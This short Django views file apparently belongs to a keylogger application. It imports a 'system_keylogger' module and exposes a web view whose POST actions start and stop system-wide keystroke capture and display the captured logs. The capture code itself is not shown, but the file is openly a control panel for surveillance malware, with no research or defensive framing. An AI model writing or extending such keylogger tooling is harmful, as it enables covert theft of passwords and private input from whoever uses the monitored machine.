from django.shortcuts import render, redirect
from . import system_keylogger

def keylogger_view(request):
    logs = ""
    if request.method == 'POST':
        action = request.POST.get('action')
        if action == 'start':
            system_keylogger.start_keylogger()
        elif action == 'stop':
            system_keylogger.stop_keylogger()
        elif action == 'show':
            logs = system_keylogger.get_logs()
    return render(request, 'keylogger.html', {'logs': logs})
